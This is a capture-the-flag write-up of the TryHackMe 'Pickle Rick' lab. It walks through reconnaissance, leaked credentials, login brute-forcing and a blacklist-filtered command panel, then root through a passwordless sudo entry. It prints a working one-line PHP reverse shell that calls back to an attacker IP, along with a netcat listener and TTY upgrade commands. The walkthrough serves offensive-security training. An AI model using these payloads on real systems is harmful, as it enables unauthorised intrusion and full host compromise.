# Key Findings

## Web Application and Linux System Compromise — TryHackMe: Pickle Rick

---

# 1. Initial Reconnaissance: Network and Web Application Discovery

### 1.1. Port Scanning with Nmap

As with any engagement, the assessment began with network reconnaissance to establish a baseline understanding of the target's exposed attack surface. An aggressive `nmap` scan was run against the target:

```
nmap -A 10.48.176.236
```

The `-A` flag enables OS detection, version detection, script scanning, and traceroute in a single pass, trading scan speed for depth of information — a reasonable trade-off for a single, non-time-constrained target.

The scan returned two open ports:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 (Ubuntu) |
| 80   | HTTP    | Apache httpd 2.4.41 (Ubuntu) |

**Table 1: Identified Open Ports and Services**

As is typical, SSH was set aside as a second-priority target — without valid credentials it offers little immediate value beyond brute-forcing, which is noisy and slow. Port 80 was the far more productive lead, and the HTTP title returned by the scan (`Rick is sup4r cool`) was itself already a thematic clue about the box, hinting the target would lean heavily on Rick and Morty references for its credentials and file names — a detail worth keeping in mind for later wordlist and guessing decisions.

---

### 1.2. Source Inspection and Credential Discovery

Browsing to the site presented an in-character "Help Morty!" page: Rick explains he has turned himself into a pickle and needs Morty to log into "his computer" to retrieve three secret ingredients, but the password is unknown.

Rather than immediately reaching for automated tools, the raw page source was inspected first (`view-source:`). This turned up a developer's HTML comment left in the page:

```html
<!--
Note to self, remember username!
Username: R1ckRul3s
-->
```

This is a classic and deliberately-placed misconfiguration: sensitive information left in client-visible markup rather than removed before deployment. It's a reminder that automated content discovery is not a substitute for manually reading what's actually shipped to the browser — comments, inline scripts, and metadata are frequently overlooked by scanners but trivially found by a human reviewing the response.

This gave half of a credential pair: **username `R1ckRul3s`**, password still unknown.

---

### 1.3. Content Discovery with Gobuster and ffuf

With a username in hand but no clear login page yet, directory brute-forcing was used to map the rest of the site.

```
gobuster dir -u http://10.48.176.236 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

This surfaced a single directory, `/assets` (HTTP 301), which on inspection held only static site resources (stylesheets, jQuery, and image assets including `fail.gif` and `picklerick.gif`) — no direct lead, but the `fail.gif` name would later turn out to be relevant to the Command Panel's filtered-command response.

Because Gobuster's default wordlist only tests for extensionless paths, `ffuf` was used as a second pass with common backend extensions appended, on the assumption that a login mechanism (implied by the "username" hint) would live behind a server-side script:

```
ffuf -u http://10.49.151.43/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html,.bak
```

This is a meaningful refinement over the first scan: it specifically targets `.php` — the language strongly implied by the Apache/Ubuntu stack — rather than assuming extensionless routing. The result was four new endpoints:

| Path | Status | Notes |
|------|--------|-------|
| `login.php`  | 200 | Authentication form |
| `portal.php` | 302 | Redirects — implies an auth-gated page |
| `denied.php` | 302 | Likely the "access denied" redirect target |
| `robots.txt` | 200 | Standard crawler-exclusion file |

**Table 2: Discovered Web Endpoints**

The pairing of `login.php` (200, publicly reachable) with `portal.php` (302, redirecting away) is a strong signal of a session-gated admin/command area — `portal.php` is almost certainly the payoff once valid credentials are supplied.

---

# 2. Gaining Initial Access: Authentication and Command Execution

### 2.1. Password Discovery via robots.txt

`robots.txt` is nominally a file for search-engine crawler directives, but on this target it had been repurposed (deliberately, in-theme) to hide a credential:

```
Wubbalubbadubdub
```

This is Rick's signature catchphrase from the show, consistent with the box's puzzle logic of hiding real credentials inside thematic references rather than requiring brute force. Testing this string as the password for the previously-found username `R1ckRul3s` against `login.php` succeeded immediately.

It's worth noting that a parallel brute-force path was also validated using Burp Suite to capture the exact POST body shape (`username=R1ckRul3s&password=FUZZ&sub=Login`), followed by an `ffuf`-driven POST fuzzing run against `rockyou.txt`, filtering on the literal string `Invalid username or password` and later on response size. This confirmed the login mechanism was a standard, unthrottled POST form — meaning the target was technically vulnerable to credential brute-forcing regardless of the `robots.txt` shortcut. In a real engagement this absence of rate-limiting or lockout would be worth flagging on its own, independent of how the password was actually obtained here.

**Working credentials:** `R1ckRul3s : Wubbalubbadubdub`

---

### 2.2. The Command Panel and Its Filter

Authenticating redirected to `portal.php` — a "Command Panel" that takes free-text input and executes it server-side, echoing the output back to the page. This is effectively an intentional, unauthenticated-to-any-logged-in-user OS command injection interface, and it is the crux of the box.

An initial `ls` confirmed the working directory and revealed the target ingredient file by name:

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Attempting to read that file directly (e.g. `cat Sup3rS3cretPickl3Ingred.txt`) was blocked, returning:

> **Command disabled** to make it hard for future **PICKLEEEE RICCCKKKK.**

This indicates a **blacklist-style filter** on the command input — rather than restricting *what can be executed* structurally, specific substrings or commands (likely `cat`, or the filename itself) are being pattern-matched and refused. Blacklist filtering of command input is a well-known weak control: it is trivially bypassed by using an equivalent command, a wildcard, string concatenation, or — as used here — by pivoting to a different technique entirely (a reverse shell) rather than fighting the filter head-on.

---

### 2.3. The Base64 "Rabbit Hole"

The filtered-command response page also contained an HTML comment holding a base64-encoded string. Decoding revealed it had been **base64-encoded multiple times in sequence** — six or seven layers deep. Peeling back each layer in turn eventually resolved to the plaintext:

```
rabbit hole
```

This confirms the string was a deliberate red herring planted by the box author — a small piece of misdirection designed to cost time on manual analysis rather than lead toward the objective. It's included here as a finding in its own right: not every discovered artifact on a target is meaningful, and recognizing a dead end (multi-layer encoding that terminates in a joke, rather than credentials or a path) is as important a skill as finding a real lead.

---

# 3. Achieving Code Execution: PHP Reverse Shell

### 3.1. Confirming the Stack with Wappalyzer

Before committing to a shell payload, the Wappalyzer browser extension was used to fingerprint the target's technology stack from the client side, confirming:

| Category | Technology |
|---|---|
| Web server | Apache HTTP Server 2.4.41 |
| OS | Ubuntu |
| Language | PHP |
| JS library | jQuery 3.3.1 |
| UI framework | Bootstrap 3.4.0 |

**Table 3: Fingerprinted Technology Stack**

This step is a useful sanity check before crafting a payload — confirming PHP is genuinely in play (rather than assuming it purely from the `.php` extensions found earlier) avoids wasting an attempt on a mismatched shell type.

### 3.2. Crafting and Deploying the Reverse Shell

Given the Command Panel's blacklist filtering blocked direct file reads but not all commands, the strategy shifted from fighting the filter to using the command execution primitive to establish a fully interactive channel instead. A one-line PHP reverse shell was submitted through the Command Panel:

```php
php -r '$sock=fsockopen("192.168.128.15",4444);exec("sh <&3 >&3 2>&3");'
```

This command:
- Uses `fsockopen()` to open a raw TCP socket back to the attacker's IP on port 4444.
- Uses `exec("sh <&3 >&3 2>&3")` to bind a shell's stdin/stdout/stderr to that socket's file descriptor (3), turning the outbound TCP connection into an interactive shell session.

Because this is an *outbound* connection initiated by the target, it commonly bypasses inbound firewall restrictions that would block a direct connection to the server — the same reasoning that makes reverse shells the standard choice in this kind of scenario.

### 3.3. Establishing a Netcat Listener

A Netcat listener was started on the attacking host ahead of triggering the payload:

```
nc -lvnp 4444
```

- `-l` — listen mode
- `-v` — verbose output
- `-n` — skip DNS resolution
- `-p 4444` — bind to local port 4444, matching the port hard-coded into the PHP payload

Executing the payload via the Command Panel produced an immediate inbound connection:

```
connect to [192.168.128.15] from (UNKNOWN) [10.49.151.43] 39980
```

landing in `/var/www/html` as the low-privileged **`www-data`** user — the standard identity for an Apache worker process, and confirmation that code execution was achieved through the web application layer.

### 3.4. TTY Upgrade

The shell received via Netcat is a raw pipe, not a true interactive terminal — no line editing, no job control, and no handling of `Ctrl+C` beyond killing the whole session. It was upgraded using Python's `pty` module, available by default on the target:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This spawns `/bin/bash` inside a pseudo-terminal, which is enough to make the session usable for interactive navigation and multi-line commands — a near-universal first step once a raw shell lands on a Linux target with Python installed.

---

# 4. Privilege Escalation

### 4.1. A Passwordless `sudo` Misconfiguration

With an interactive shell as `www-data`, the natural next check is what privilege the current user has been granted, rather than immediately hunting for kernel exploits or SUID binaries. The simplest possible check — attempting `sudo` outright — was tried first:

```
sudo su
```

This succeeded **without prompting for a password**, dropping directly into a root shell. This is a severe and avoidable misconfiguration: it means `/etc/sudoers` (or a drop-in file under `/etc/sudoers.d/`) grants `www-data` `NOPASSWD` sudo rights, most likely as a blanket `ALL` entry rather than being scoped to a specific, safe binary. Because `www-data` is the identity an attacker gains from essentially any web application compromise on this host, this single line in the sudoers configuration collapses the entire privilege boundary between "compromised web app" and "root on the box" — there is no meaningful privilege escalation *technique* here so much as an absence of one being necessary.

This is worth calling out distinctly from the earlier, "intended puzzle" steps: unlike the base64 rabbit hole or the blacklist filter, this is not a themed puzzle mechanic but a realistic, commonly-seen production misconfiguration (over-permissive sudoers entries for service accounts), and would be flagged as a high-severity finding on a real assessment.

### 4.2. Root Access and Final Artifact

From the resulting root shell, `/root` was inspected directly:

```
cd root
ls
```
```
3rd.txt  snap
```

Confirming full, unrestricted read access to the root user's home directory — the natural endpoint of the compromise chain.

---

# 5. Conclusion and Ingredients Collected

This assessment demonstrated a complete compromise of the target, from unauthenticated reconnaissance through to root access, via the following chain:

1. **Information disclosure** — a developer comment in page source leaked a valid username.
2. **Information disclosure** — `robots.txt`, ostensibly a crawler-exclusion file, leaked the corresponding password.
3. **Missing authentication controls** — no rate-limiting or lockout on the login form (independently confirmed via brute-force testing).
4. **OS command injection** — the authenticated Command Panel executed arbitrary shell commands, with only a weak, bypassable blacklist filter in place.
5. **Reverse shell foothold** — a one-line PHP payload converted command-injection access into a fully interactive session as `www-data`.
6. **Privilege escalation** — a passwordless `sudo` entry for `www-data` allowed immediate escalation to root, with no exploit required.


**Table 4: Recovered Ingredients and Their Locations**

The compromise chain illustrates a common real-world pattern even within a deliberately themed CTF: initial access rarely comes from a single sophisticated exploit, but from the accumulation of small, individually low-severity issues — leaked credentials in comments and metadata, an unauthenticated command interface, and finally an over-permissive `sudo` configuration that removes any real barrier to full system compromise once a foothold exists.
